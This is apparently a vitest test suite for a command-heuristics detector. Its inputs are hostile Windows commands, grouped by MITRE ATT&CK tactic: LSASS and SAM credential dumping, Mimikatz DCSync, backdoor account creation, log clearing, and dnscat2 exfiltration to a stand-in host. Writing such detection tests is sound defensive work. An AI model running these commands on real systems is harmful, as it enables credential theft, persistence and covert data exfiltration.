import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("MITRE ATT&CK threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- Credential Access ---

	it("detects LSASS dump (MITRE-001)", () => {
		expect(matchCommand(engine, "rundll32.exe comsvcs.dll,MiniDump 624 lsass.dmp full")).toContain(
			"CLT-MITRE-001",
		);
	});

	it("detects SAM registry save (MITRE-002)", () => {
		expect(matchCommand(engine, "reg save HKLM\\sam sam")).toContain("CLT-MITRE-002");
	});

	it("does not match SAM rule on normal reg query (MITRE-002)", () => {
		const ids = matchCommand(engine, "reg query HKLM\\SOFTWARE");
		expect(ids.filter((id) => id === "CLT-MITRE-002")).toEqual([]);
	});

	it("detects NTDS dumping (MITRE-003)", () => {
		expect(matchCommand(engine, 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp"')).toContain(
			"CLT-MITRE-003",
		);
	});

	it("detects LSA Secrets access (MITRE-004)", () => {
		expect(matchCommand(engine, "Get-LSASecret.ps1")).toContain("CLT-MITRE-004");
	});

	it("detects cached credentials listing (MITRE-005)", () => {
		expect(matchCommand(engine, "cmdkey /list")).toContain("CLT-MITRE-005");
	});

	it("detects DCSync attack (MITRE-006)", () => {
		expect(
			matchCommand(engine, 'Invoke-Mimikatz -Command "lsadump::dcsync /user:admin"'),
		).toContain("CLT-MITRE-006");
	});

	it("detects credential dump via reg save (MITRE-007)", () => {
		expect(matchCommand(engine, "reg save HKLM\\SAM c:\\temp\\sam")).toContain("CLT-MITRE-007");
	});

	it("detects credential stuffing (MITRE-042)", () => {
		expect(matchCommand(engine, "Invoke-CredentialInjection.ps1")).toContain("CLT-MITRE-042");
	});

	it("detects credentials in registry (MITRE-083)", () => {
		expect(matchCommand(engine, "reg query HKLM /f password /t REG_SZ /s")).toContain(
			"CLT-MITRE-083",
		);
	});

	it("does not match credentials in registry on normal reg query (MITRE-083)", () => {
		const ids = matchCommand(engine, "reg query HKLM\\SOFTWARE /v Version");
		expect(ids.filter((id) => id === "CLT-MITRE-083")).toEqual([]);
	});

	it("detects browser credential dumping (MITRE-086)", () => {
		expect(matchCommand(engine, "Get-ChromeDump.ps1")).toContain("CLT-MITRE-086");
	});

	it("detects password store access (MITRE-087)", () => {
		expect(matchCommand(engine, "Get-VaultCredential.ps1")).toContain("CLT-MITRE-087");
	});

	it("detects Golden Ticket attack (MITRE-088)", () => {
		expect(matchCommand(engine, "Invoke-Mimikatz Golden Ticket")).toContain("CLT-MITRE-088");
	});

	it("does not match Golden Ticket on normal domain query (MITRE-088)", () => {
		const ids = matchCommand(engine, 'net group "Domain Users" /domain');
		expect(ids.filter((id) => id === "CLT-MITRE-088")).toEqual([]);
	});

	it("detects Silver Ticket attack (MITRE-089)", () => {
		expect(matchCommand(engine, "Invoke-Mimikatz Silver Ticket")).toContain("CLT-MITRE-089");
	});

	it("detects Kerberoasting (MITRE-090)", () => {
		expect(matchCommand(engine, "Invoke-Kerberoast")).toContain("CLT-MITRE-090");
	});

	it("detects AS-REP Roasting (MITRE-091)", () => {
		expect(matchCommand(engine, "Get-ASREPHash")).toContain("CLT-MITRE-091");
	});

	// --- Discovery ---

	it("detects network scanning (MITRE-022)", () => {
		expect(matchCommand(engine, "nmap -sV 192.168.1.0/24")).toContain("CLT-MITRE-022");
	});

	it("detects permission group discovery (MITRE-032)", () => {
		expect(matchCommand(engine, "Get-ManagementRoleAssignment")).toContain("CLT-MITRE-032");
	});

	it("detects domain account discovery (MITRE-037)", () => {
		expect(matchCommand(engine, "net user admin /dom")).toContain("CLT-MITRE-037");
	});

	it("does not match domain account rule on local net user (MITRE-037)", () => {
		const ids = matchCommand(engine, "net user");
		expect(ids.filter((id) => id === "CLT-MITRE-037")).toEqual([]);
	});

	it("detects email account discovery (MITRE-038)", () => {
		expect(matchCommand(engine, "Get-GlobalAddressList")).toContain("CLT-MITRE-038");
	});

	it("detects peripheral discovery (MITRE-043)", () => {
		expect(matchCommand(engine, "Get-WMIObject Win32_PnPEntity")).toContain("CLT-MITRE-043");
	});

	it("detects password policy discovery (MITRE-050)", () => {
		expect(matchCommand(engine, "net accounts")).toContain("CLT-MITRE-050");
	});

	it("detects domain trust discovery (MITRE-066)", () => {
		expect(matchCommand(engine, "nltest /domain_trusts")).toContain("CLT-MITRE-066");
	});

	it("does not match domain trust rule on nltest sc_query (MITRE-066)", () => {
		const ids = matchCommand(engine, "nltest /sc_query:DOMAIN");
		expect(ids.filter((id) => id === "CLT-MITRE-066")).toEqual([]);
	});

	it("detects security software discovery (MITRE-071)", () => {
		expect(matchCommand(engine, "tasklist /v | findstr virus")).toContain("CLT-MITRE-071");
	});

	it("does not match security software rule on plain tasklist (MITRE-071)", () => {
		const ids = matchCommand(engine, "tasklist /v");
		expect(ids.filter((id) => id === "CLT-MITRE-071")).toEqual([]);
	});

	it("detects software discovery (MITRE-072)", () => {
		expect(matchCommand(engine, "wmic product get name")).toContain("CLT-MITRE-072");
	});

	it("does not match software discovery on wmic os (MITRE-072)", () => {
		const ids = matchCommand(engine, "wmic os get caption");
		expect(ids.filter((id) => id === "CLT-MITRE-072")).toEqual([]);
	});

	it("detects AV reconnaissance (MITRE-104)", () => {
		expect(matchCommand(engine, "powershell -Class AntiVirusProduct")).toContain("CLT-MITRE-104");
	});

	it("does not match AV recon on normal WMI class (MITRE-104)", () => {
		const ids = matchCommand(engine, "powershell -Class Win32_OperatingSystem");
		expect(ids.filter((id) => id === "CLT-MITRE-104")).toEqual([]);
	});

	it("detects client config discovery (MITRE-105)", () => {
		expect(matchCommand(engine, "powershell Get-SmbShare")).toContain("CLT-MITRE-105");
	});

	// --- Persistence ---

	it("detects scheduled task creation (MITRE-026)", () => {
		expect(matchCommand(engine, "schtasks /create /tn evil /tr cmd.exe /sc daily")).toContain(
			"CLT-MITRE-026",
		);
	});

	it("does not match scheduled task query (MITRE-026)", () => {
		const ids = matchCommand(engine, "schtasks /query");
		expect(ids.filter((id) => id === "CLT-MITRE-026")).toEqual([]);
	});

	it("detects Exchange manipulation (MITRE-039)", () => {
		expect(matchCommand(engine, "Add-MailboxPermission -User attacker")).toContain("CLT-MITRE-039");
	});

	it("detects account manipulation (MITRE-040)", () => {
		expect(matchCommand(engine, "net user hacker P@ss /add")).toContain("CLT-MITRE-040");
	});

	it("does not match account manipulation on net user without /add (MITRE-040)", () => {
		const ids = matchCommand(engine, "net user admin");
		expect(ids.filter((id) => id === "CLT-MITRE-040")).toEqual([]);
	});

	it("detects local account creation (MITRE-048)", () => {
		expect(matchCommand(engine, "net user backdoor Pass123 /add")).toContain("CLT-MITRE-048");
	});

	it("detects domain account creation (MITRE-049)", () => {
		expect(matchCommand(engine, "net user newadmin Pass123 /add /domain")).toContain(
			"CLT-MITRE-049",
		);
	});

	it("detects GPO modification (MITRE-067)", () => {
		expect(matchCommand(engine, "New-GPOImmediateTask -TaskName evil")).toContain("CLT-MITRE-067");
	});

	it("detects file association hijacking (MITRE-075)", () => {
		expect(matchCommand(engine, "cmd /c assoc .txt=evilhandler")).toContain("CLT-MITRE-075");
	});

	it("does not match file association rule on cmd /c dir (MITRE-075)", () => {
		const ids = matchCommand(engine, "cmd /c dir");
		expect(ids.filter((id) => id === "CLT-MITRE-075")).toEqual([]);
	});

	it("detects WMI event subscription (MITRE-076)", () => {
		expect(matchCommand(engine, "scrcons.exe")).toContain("CLT-MITRE-076");
	});

	it("detects boot autostart persistence (MITRE-081)", () => {
		expect(matchCommand(engine, "Add-Persistence.ps1")).toContain("CLT-MITRE-081");
	});

	// --- Defense Evasion ---

	it("detects steganography (MITRE-016)", () => {
		expect(matchCommand(engine, "Invoke-PSImage -Script payload.ps1")).toContain("CLT-MITRE-016");
	});

	it("detects indicator removal (MITRE-017)", () => {
		expect(matchCommand(engine, "Find-AVSignature -Startbyte 0")).toContain("CLT-MITRE-017");
	});

	it("detects DLL injection (MITRE-027)", () => {
		expect(matchCommand(engine, "Invoke-DllInjection.ps1")).toContain("CLT-MITRE-027");
	});

	it("detects evidence file deletion (MITRE-033)", () => {
		expect(matchCommand(engine, "cmd /c del /s /q c:\\evidence")).toContain("CLT-MITRE-033");
	});

	it("does not match file deletion rule on cmd /c echo (MITRE-033)", () => {
		const ids = matchCommand(engine, "cmd /c echo hello");
		expect(ids.filter((id) => id === "CLT-MITRE-033")).toEqual([]);
	});

	it("detects share removal (MITRE-034)", () => {
		expect(matchCommand(engine, "net use \\\\server\\share /delete")).toContain("CLT-MITRE-034");
	});

	it("does not match share removal on net use without /delete (MITRE-034)", () => {
		const ids = matchCommand(engine, "net use \\\\server\\share");
		expect(ids.filter((id) => id === "CLT-MITRE-034")).toEqual([]);
	});

	it("detects indirect command execution (MITRE-051)", () => {
		expect(matchCommand(engine, "rundll32.exe shell32.dll,ShellExec_RunDLL notepad.exe")).toContain(
			"CLT-MITRE-051",
		);
	});

	it("does not match indirect exec on LockWorkStation (MITRE-051)", () => {
		const ids = matchCommand(engine, "rundll32.exe user32.dll,LockWorkStation");
		expect(ids.filter((id) => id === "CLT-MITRE-051")).toEqual([]);
	});

	it("detects caret obfuscation (MITRE-052)", () => {
		expect(matchCommand(engine, "p^o^w^e^r^s^h^e^l^l")).toContain("CLT-MITRE-052");
	});

	it("detects PubPrn abuse (MITRE-053)", () => {
		expect(matchCommand(engine, "pubprn.vbs")).toContain("CLT-MITRE-053");
	});

	it("detects Verclsid abuse (MITRE-064)", () => {
		expect(
			matchCommand(engine, "verclsid.exe /S /C {00000001-0000-0000-0000-000000000000}"),
		).toContain("CLT-MITRE-064");
	});

	it("detects XSL script processing (MITRE-065)", () => {
		expect(matchCommand(engine, "wmic process list /FORMAT:evil.xsl")).toContain("CLT-MITRE-065");
	});

	it("does not match XSL rule on wmic without FORMAT .xsl (MITRE-065)", () => {
		const ids = matchCommand(engine, "wmic process list brief");
		expect(ids.filter((id) => id === "CLT-MITRE-065")).toEqual([]);
	});

	it("detects UAC bypass (MITRE-082)", () => {
		expect(matchCommand(engine, "Invoke-BypassUAC.ps1")).toContain("CLT-MITRE-082");
	});

	it("detects root certificate installation (MITRE-085)", () => {
		expect(matchCommand(engine, "certutil -addstore root evil.cer")).toContain("CLT-MITRE-085");
	});

	it("does not match root cert rule on certutil verify (MITRE-085)", () => {
		const ids = matchCommand(engine, "certutil -verify cert.pem");
		expect(ids.filter((id) => id === "CLT-MITRE-085")).toEqual([]);
	});

	it("detects audit policy disable (MITRE-093)", () => {
		expect(matchCommand(engine, "AUDITPOL /set /category:Detailed Tracking")).toContain(
			"CLT-MITRE-093",
		);
	});

	it("detects history logging disable (MITRE-094)", () => {
		expect(matchCommand(engine, "Set-PSReadlineOption -HistorySaveStyle SaveNothing")).toContain(
			"CLT-MITRE-094",
		);
	});

	it("detects indicator blocking via log clear (MITRE-095)", () => {
		expect(matchCommand(engine, "wevtutil cl Security")).toContain("CLT-MITRE-095");
	});

	it("does not match indicator blocking on wevtutil query (MITRE-095)", () => {
		const ids = matchCommand(engine, "wevtutil qe System");
		expect(ids.filter((id) => id === "CLT-MITRE-095")).toEqual([]);
	});

	// --- Exfiltration ---

	it("detects automated exfiltration (MITRE-012)", () => {
		expect(matchCommand(engine, "rar a -dw archive.rar secret/")).toContain("CLT-MITRE-012");
	});

	it("does not match exfiltration on rar extract (MITRE-012)", () => {
		const ids = matchCommand(engine, "rar x archive.rar");
		expect(ids.filter((id) => id === "CLT-MITRE-012")).toEqual([]);
	});

	it("detects alternative protocol exfiltration (MITRE-023)", () => {
		expect(matchCommand(engine, "dnscat2 --secret=abc evil.com")).toContain("CLT-MITRE-023");
	});

	it("detects code repo exfiltration (MITRE-099)", () => {
		expect(matchCommand(engine, "Invoke-ExfilDataToGitHub")).toContain("CLT-MITRE-099");
	});

	it("detects cloud storage exfiltration (MITRE-100)", () => {
		expect(matchCommand(engine, "Invoke-DropboxUpload")).toContain("CLT-MITRE-100");
	});

	// --- Execution ---

	it("detects netsh helper DLL (MITRE-077)", () => {
		expect(matchCommand(engine, "netsh.exe add helper evil.dll")).toContain("CLT-MITRE-077");
	});

	it("does not match netsh helper on netsh interface (MITRE-077)", () => {
		const ids = matchCommand(engine, "netsh interface show");
		expect(ids.filter((id) => id === "CLT-MITRE-077")).toEqual([]);
	});

	it("detects system service manipulation (MITRE-102)", () => {
		expect(matchCommand(engine, "sc sdset WinDefend D:")).toContain("CLT-MITRE-102");
	});

	it("does not match system service on sc query (MITRE-102)", () => {
		const ids = matchCommand(engine, "sc query WinDefend");
		expect(ids.filter((id) => id === "CLT-MITRE-102")).toEqual([]);
	});

	// --- Lateral Movement ---

	it("detects DCOM lateral movement (MITRE-014)", () => {
		expect(matchCommand(engine, "Invoke-DCOM -ComputerName DC01")).toContain("CLT-MITRE-014");
	});

	it("detects RDP session hijacking (MITRE-096)", () => {
		expect(matchCommand(engine, "tscon 2 /dest:rdp-tcp#0")).toContain("CLT-MITRE-096");
	});

	// --- Privilege Escalation ---

	it("detects IFEO injection (MITRE-078)", () => {
		expect(matchCommand(engine, "Add-RegBackdoor.ps1")).toContain("CLT-MITRE-078");
	});

	// --- Collection ---

	it("detects archive collection (MITRE-092)", () => {
		expect(matchCommand(engine, "7z a -p archive.7z sensitive/")).toContain("CLT-MITRE-092");
	});

	it("does not match archive collection on extract (MITRE-092)", () => {
		const ids = matchCommand(engine, "7z x archive.7z");
		expect(ids.filter((id) => id === "CLT-MITRE-092")).toEqual([]);
	});

	// --- Command & Control ---

	it("detects tool transfer via certutil (MITRE-041)", () => {
		expect(matchCommand(engine, "certutil -decode payload.b64 evil.exe")).toContain(
			"CLT-MITRE-041",
		);
	});

	it("does not match tool transfer on certutil verify (MITRE-041)", () => {
		const ids = matchCommand(engine, "certutil -verify cert.pem");
		expect(ids.filter((id) => id === "CLT-MITRE-041")).toEqual([]);
	});
});
